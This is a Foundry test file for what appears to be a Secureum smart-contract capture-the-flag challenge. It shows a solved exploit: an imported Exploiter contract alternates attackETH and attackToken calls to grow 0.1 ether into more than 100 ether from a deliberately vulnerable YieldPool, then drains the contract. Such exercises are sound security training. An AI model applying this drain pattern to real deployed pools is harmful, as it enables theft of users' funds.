// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

import "../src/6_yieldPool/Exploiter.sol";


/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge6Test is Test {
    SecureumToken public token;
    YieldPool public yieldPool;

    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");

    function setUp() public {
        // setup pool with 10_000 ETH and ST tokens
        uint256 start_liq = 10_000 ether;
        vm.deal(address(owner), start_liq);
        vm.prank(owner);
        token = new SecureumToken(start_liq);
        yieldPool = new YieldPool(token);
        vm.prank(owner);
        token.increaseAllowance(address(yieldPool), start_liq);
        vm.prank(owner);
        yieldPool.addLiquidity{value: start_liq}(start_liq);

        // attacker starts with 0.1 ether
        vm.deal(address(attacker), 0.1 ether);
    }

    function testExploitPool() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge6Test -vvvv //
        ////////////////////////////////////////////////////*/

        Exploiter exploiter = new Exploiter{value: 0.1 ether}(address(yieldPool));

        uint256 counter = 0;
        while (address(exploiter).balance < 100 ether)
        {
            if (counter % 2 == 0)
            {
                exploiter.attackETH();
            }
            else
            {
                exploiter.attackToken();
            }

            counter++;
        }

        exploiter.drain(); 

        //==================================================//
        vm.stopPrank();

        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
    }
}
